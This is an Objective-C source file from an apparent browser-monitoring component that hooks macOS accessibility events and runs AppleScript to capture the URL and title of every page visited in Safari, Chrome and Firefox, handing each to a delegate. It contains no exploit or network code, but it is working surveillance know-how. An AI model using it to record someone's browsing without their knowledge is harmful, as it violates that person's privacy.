//
//  PageVisitedNotifier.m
//  PageVisitedCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 10/2/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "PageVisitedNotifier.h"
#import "PageInfo.h"
#import "FirefoxUrlInfoInquirer.h"
#import "Firefox.h"

#import "SystemUtilsImpl.h"

NSString * const kSafariBundleID         = @"com.apple.Safari";
NSString * const kFirefoxBundleID        = @"org.mozilla.firefox";
NSString * const kGoogleChromeBundleID   = @"com.google.Chrome";

@implementation PageVisitedNotifier
@synthesize mPageVisitedDelegate;
@synthesize mPageURLSafari;
@synthesize mPageURLFirefox;
@synthesize mPageURLChrome;
@synthesize mObserver1;
@synthesize mObserver2;
@synthesize mObserver3;
@synthesize mLoop1;
@synthesize mLoop2;
@synthesize mLoop3;
@synthesize mProcess1;
@synthesize mProcess2;
@synthesize mProcess3;

-(id)initWithPageVisitedDelegate:(id<PageVisitedDelegate>) aPageVisitedDelegate{
    if ((self = [super init])) {
        mSafariSleepTime = 2;
        mChromeSleepTime = 2;
        mFirefoxSleepTime = 2;
        [self setMPageVisitedDelegate:aPageVisitedDelegate];
        mFirefoxUrlInquirer = [[FirefoxUrlInfoInquirer alloc] init];
    }
    return self;
}

-(void) startNotify{
    [self stopNotify];
    
    DLog(@"Start notify");

    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(pageVisitedRegisterAppNotify:)  name:NSWorkspaceDidActivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(pageVisitedUnRegisterAppNotify:)  name:NSWorkspaceDidDeactivateApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(pageVisitedRegisterAppNotifyCaseLaunch:)  name:NSWorkspaceDidLaunchApplicationNotification  object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self  selector:@selector(pageVisitedUnRegisterAppNotifyCaseTerminate:)  name:NSWorkspaceDidTerminateApplicationNotification  object:nil];
    
}
-(void) stopNotify{
    DLog(@"Stop notify");
    
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidActivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidDeactivateApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidLaunchApplicationNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter]removeObserver:self name:NSWorkspaceDidTerminateApplicationNotification object:nil];
    
    [self unRegisterPageEventSafari];
    [self unRegisterPageEventFirefox];
    [self unRegisterPageEventChrome];
}

-(void) pageVisitedRegisterAppNotify:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication * runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    if ([[runningapp bundleIdentifier]isEqualToString:kSafariBundleID]) {
        [self registerPageEventSafari];
        [self titleChangeCallBack];
    }else if ([[runningapp bundleIdentifier]isEqualToString:kGoogleChromeBundleID]){
        [self registerPageEventChrome];
        [self titleChangeCallBack];
    }else if ([[runningapp bundleIdentifier]isEqualToString:kFirefoxBundleID]){
        [self registerPageEventFirefox];
        [self titleChangeCallBack];
    }
}

-(void) pageVisitedUnRegisterAppNotify:(NSNotification *)notification {
    NSDictionary *userInfo = [notification userInfo];
    NSRunningApplication *runningapp = [userInfo objectForKey:[[userInfo allKeys]objectAtIndex:0]];
    
    if ([[runningapp bundleIdentifier]isEqualToString:kSafariBundleID]) {
        DLog(@"Did Stop unRegisterPageEventSafari");
        [self unRegisterPageEventSafari];
    }else if ([[runningapp bundleIdentifier]isEqualToString:kGoogleChromeBundleID]){
        DLog(@"Did Stop unRegisterPageEventChrome");
        [self unRegisterPageEventChrome];
    }else if ([[runningapp bundleIdentifier]isEqualToString:kFirefoxBundleID]){
        DLog(@"Did Stop unRegisterPageEventFirefox");
        [self unRegisterPageEventFirefox];
    }
}

-(void) pageVisitedRegisterAppNotifyCaseLaunch:(NSNotification *)notification {

    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    
    if ([appBundleIdentifier isEqualToString:kSafariBundleID]) {
        DLog(@"register Launch Safari");
        mSafariSleepTime = 2;
    }else if ([appBundleIdentifier isEqualToString:kGoogleChromeBundleID]){
        DLog(@"register Launch Chrome");
        mChromeSleepTime = 2;
    }else if ([appBundleIdentifier isEqualToString:kFirefoxBundleID]){
        DLog(@"register Launch Firefox");
        mFirefoxSleepTime = 2;
    }
}

-(void) pageVisitedUnRegisterAppNotifyCaseTerminate:(NSNotification *)notification {

    NSDictionary *userInfo = [notification userInfo];
    NSString * appBundleIdentifier = [userInfo objectForKey:@"NSApplicationBundleIdentifier"];
    if ([appBundleIdentifier isEqualToString:kSafariBundleID]) {
        [self unRegisterPageEventSafari];
        mSafariSleepTime = 2;
    }else if([appBundleIdentifier isEqualToString:kGoogleChromeBundleID]){
        [self unRegisterPageEventChrome];
        mChromeSleepTime = 2;
    }else if ([appBundleIdentifier isEqualToString:kFirefoxBundleID]){
        [self unRegisterPageEventFirefox];
        mFirefoxSleepTime = 2;
    }
}

-(void) registerPageEventSafari{
    int counter = 4;
    sleep(mSafariSleepTime);
    BOOL isRegister = false;
    while (!isRegister) {
        NSArray * checker = [NSRunningApplication runningApplicationsWithBundleIdentifier:kSafariBundleID];
        if ([checker count]>0) {
            NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Safari\")\n end tell"];
            NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
            int myPid = [[Result stringValue] intValue];
            [scptFrontmost release];
            pid_t pid = myPid;

            mProcess1 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, MyAXObserverCallback, &mObserver1);
            mLoop1 = CFRunLoopGetCurrent();

           if ([SystemUtilsImpl isOSX_10_9]) {
                DLog(@"isOSX_10_9");
                AXObserverAddNotification(mObserver1, mProcess1,CFSTR("AXValueChanged"), self);
           }else{
                DLog(@"Greater OSX_10_9");
                AXObserverAddNotification(mObserver1, mProcess1,CFSTR("AXTitleChanged"), self);
           }
            
            CFRunLoopAddSource(mLoop1, AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Safari");
            isRegister = true;
            mSafariSleepTime = 0.2;
        }
        sleep(0.2);
        if (counter == 0) {
            break;
        }
        counter--;
    }
    if (!isRegister) {
        DLog(@"Loop is stucking that why this line is printing out and all event capture will be lose lol");
    }
}
-(void) registerPageEventChrome{
    int counter = 4;
    sleep(mChromeSleepTime);
    BOOL isRegister = false;
    while (!isRegister) {
        NSArray * checker = [NSRunningApplication runningApplicationsWithBundleIdentifier:kGoogleChromeBundleID];
        if ([checker count]>0) {
            NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Google Chrome\")\n end tell"];
            NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
            int myPid = [[Result stringValue] intValue];
            [scptFrontmost release];
            pid_t pid = myPid;

            mProcess2 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, MyAXObserverCallback, &mObserver2);
            mLoop2 = CFRunLoopGetCurrent();
            AXObserverAddNotification(mObserver2, mProcess2,CFSTR("AXTitleChanged"), self);

            CFRunLoopAddSource(mLoop2, AXObserverGetRunLoopSource(mObserver2), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Chrome");
            isRegister = true;
            mChromeSleepTime = 0.2;
        }
        sleep(0.2);
        if (counter == 0) {
            break;
        }
        counter--;
    }
    if (!isRegister) {
        DLog(@"Loop is stucking that why this line is printing out and all event capture will be lose lol");
    }
}


-(void) registerPageEventFirefox{
    int counter = 4;
    sleep(mFirefoxSleepTime);
    BOOL isRegister = false;
    while (!isRegister) {
        NSArray * checker = [NSRunningApplication runningApplicationsWithBundleIdentifier:kFirefoxBundleID];
        if ([checker count]>0) {
            NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n return the unix id of (every process whose name is \"Firefox\")\n end tell"];
            NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
            int myPid = [[Result stringValue] intValue];
            [scptFrontmost release];
            pid_t pid = myPid;

            mProcess3 = AXUIElementCreateApplication(pid);
            AXObserverCreate(pid, MyAXObserverCallback, &mObserver3);
            mLoop3 = CFRunLoopGetCurrent();
            AXObserverAddNotification(mObserver3, mProcess3,CFSTR("AXTitleChanged"), self);

            CFRunLoopAddSource(mLoop3, AXObserverGetRunLoopSource(mObserver3), kCFRunLoopDefaultMode);
            DLog(@"registerPageEvent Firefox");
            isRegister = true;
            mFirefoxSleepTime = 0.2;
        }
        sleep(0.2);
        if (counter == 0) {
            break;
        }
        counter--;
    }
    if (!isRegister) {
        DLog(@"Loop is stucking that why this line is printing out and all event capture will be lose lol");
    }
    
}
-(void) unRegisterPageEventSafari{
    if ( mObserver1 != nil ) {
        DLog(@"unRegisterPageEventSafari");
        AXObserverRemoveNotification(mObserver1, mProcess1, CFSTR("AXTitleChanged"));

        CFRunLoopRemoveSource(mLoop1, AXObserverGetRunLoopSource(mObserver1), kCFRunLoopDefaultMode);
        mLoop1 = nil;
        mObserver1 = nil;
        mProcess1 = nil;
    }
}
-(void) unRegisterPageEventChrome{
    if ( mObserver2 != nil ) {
        DLog(@"unRegisterPageEventChrome");
        AXObserverRemoveNotification(mObserver2, mProcess2, CFSTR("AXTitleChanged"));

        CFRunLoopRemoveSource(mLoop2, AXObserverGetRunLoopSource(mObserver2), kCFRunLoopDefaultMode);
        mLoop2 = nil;
        mObserver2 = nil;
        mProcess2 = nil;
    }
}
-(void) unRegisterPageEventFirefox{
    if (mObserver3 != nil && mLoop3 != nil && mProcess3 != nil) {
        DLog(@"unRegisterPageEventFirefox");
        AXObserverRemoveNotification(mObserver3, mProcess3, CFSTR("AXTitleChanged") );

        CFRunLoopRemoveSource(mLoop3, AXObserverGetRunLoopSource(mObserver3), kCFRunLoopDefaultMode);
        mLoop3 = nil;
        mObserver3 = nil;
        mProcess3 = nil;
    }
}

void MyAXObserverCallback( AXObserverRef observer, AXUIElementRef element, CFStringRef notificationName, void * contextData ){
    CFTypeRef _title;
    if (AXUIElementCopyAttributeValue(element, (CFStringRef)NSAccessibilityTitleAttribute, (CFTypeRef *)&_title) == kAXErrorSuccess) {
        NSString *title = [NSString stringWithFormat:@"%@",_title];
        if([title length]>0){
            PageVisitedNotifier *mySelf = (PageVisitedNotifier *)contextData;
            [mySelf titleChangeCallBack];
        }
    }
    if (_title != NULL){
        CFRelease(_title);
    }
}
-(void) titleChangeCallBack{
    @try{
        
        NSString * frontMostName = @"";
        NSAppleScript *scptFrontmost=[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n item 1 of (get name of processes whose frontmost is true) \n end tell"];
        NSAppleEventDescriptor *Result=[scptFrontmost executeAndReturnError:nil];
        frontMostName = [[Result stringValue] copy];
        [scptFrontmost release];
        if ([frontMostName isEqualToString:@"Safari"]){
            
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Safari\" \n return{ URL of current tab of window 1,name of current tab of window 1} \n end tell"];
            NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
            
            if([self.mPageURLSafari length]==0){
                self.mPageURLSafari = [[scptResult descriptorAtIndex:1]stringValue];
                [self sendUrl:[[scptResult descriptorAtIndex:1]stringValue] PageName:[[scptResult descriptorAtIndex:2]stringValue] App:frontMostName];
            }else{
                NSString * original = self.mPageURLSafari;
                if(![original isEqualToString:[[scptResult descriptorAtIndex:1]stringValue]]){
                    DLog(@"Page Change");
                    self.mPageURLSafari = [[scptResult descriptorAtIndex:1]stringValue];
                    [self sendUrl:[[scptResult descriptorAtIndex:1]stringValue] PageName:[[scptResult descriptorAtIndex:2]stringValue] App:frontMostName];
                }
            }
            [scpt release];
        }
        if ([frontMostName isEqualToString:@"Google Chrome"]){
            
            NSAppleScript *scpt=[[NSAppleScript alloc]initWithSource:@"tell application \"Google Chrome\" to return {URL of active tab of front window, title of active tab of front window}"];
            NSAppleEventDescriptor *scptResult=[scpt executeAndReturnError:nil];
            
            if([self.mPageURLChrome length]==0){
                self.mPageURLChrome = [[scptResult descriptorAtIndex:1]stringValue];
                [self sendUrl:[[scptResult descriptorAtIndex:1]stringValue]  PageName:[[scptResult descriptorAtIndex:2]stringValue] App:frontMostName];
            }else{
                NSString * original = self.mPageURLChrome;
                if(![original isEqualToString:[[scptResult descriptorAtIndex:1]stringValue]]){
                    DLog(@"Page Changed");
                    self.mPageURLChrome = [[scptResult descriptorAtIndex:1]stringValue];
                    [self sendUrl:[[scptResult descriptorAtIndex:1]stringValue]  PageName:[[scptResult descriptorAtIndex:2]stringValue] App:frontMostName];
                }
            }
            [scpt release];
        }
        if ([frontMostName isEqualToString:@"firefox"]){

            @try {
                FirefoxApplication *firefoxApp = [SBApplication applicationWithBundleIdentifier:kFirefoxBundleID];
                NSString *title = [[[[firefoxApp windows] get] firstObject] name];
                NSString *url = [mFirefoxUrlInquirer urlWithTitle:title];

                if([self.mPageURLFirefox length] == 0 ){
                    self.mPageURLFirefox = url;
                    [self sendUrl:url PageName:title App:frontMostName];
                }else{
                    NSString * original = self.mPageURLFirefox;
                    if(![original isEqualToString:url]){
                        DLog(@"Page Changed");
                        self.mPageURLFirefox = url;
                        [self sendUrl:url PageName:title App:frontMostName];
                    }
                }
            }
            @catch (NSException *e) {
                DLog(@"------> PageVisited Firefox url title exception, %@", e);
            }
            @catch (...) {
                DLog(@"------> PageVisited Firefox url title unknow exception...");
            }
        }
    }@catch (NSException *exception){
        DLog(@"### exception %@",exception);
    }
}

-(void) sendUrl:(NSString *)aUrl PageName:(NSString *)aPageName App:(NSString *)aApp {
    if (![aPageName isEqualToString:@"Mozilla Firefox"] && ![aUrl isEqualToString:@"Mozilla Firefox"] &&
        ![aPageName isEqualToString:@"Top Sites"] &&![aUrl isEqualToString:@"topsites://"]            &&
        ![aPageName isEqualToString:@"New Tab"] &&![aUrl isEqualToString:@"chrome://newtab/"]         &&
        ![aPageName isEqualToString:@"Settings"] &&![aUrl isEqualToString:@"chrome://settings/"] ){
        if ([aUrl length]>0  && [aPageName length]>0 ) {
            if ([mPageVisitedDelegate respondsToSelector:@selector(pageVisited:)]) {
                DLog(@"##### aUrl %@ \n aPageName %@ \n aApp %@",aUrl,aPageName,aApp);
                PageInfo * pInfo = [[PageInfo alloc]init];
                [pInfo setMUrl:aUrl];
                [pInfo setMTitle:aPageName];
                [pInfo setMApplication:aApp];
                //[pInfo setMApplicationID:[SystemUtilsImpl frontApplicationID]];
                if ([aApp isEqualToString:@"firefox"]) {
                    [pInfo setMApplicationID:kFirefoxBundleID];
                } else if ([aApp isEqualToString:@"Safari"]) {
                    [pInfo setMApplicationID:kSafariBundleID];
                } else if ([aApp isEqualToString:@"Google Chrome"]) {
                    [pInfo setMApplicationID:kGoogleChromeBundleID];
                }
                [mPageVisitedDelegate pageVisited:pInfo];
                [pInfo release];
            }
        }
    }
}

- (void)dealloc{
    [self stopNotify];
    [mFirefoxUrlInquirer release];
    [mPageVisitedDelegate release];
    [mPageURLSafari release];
    [mPageURLFirefox release];
    [mPageURLChrome release];
    [super dealloc];
}

@end



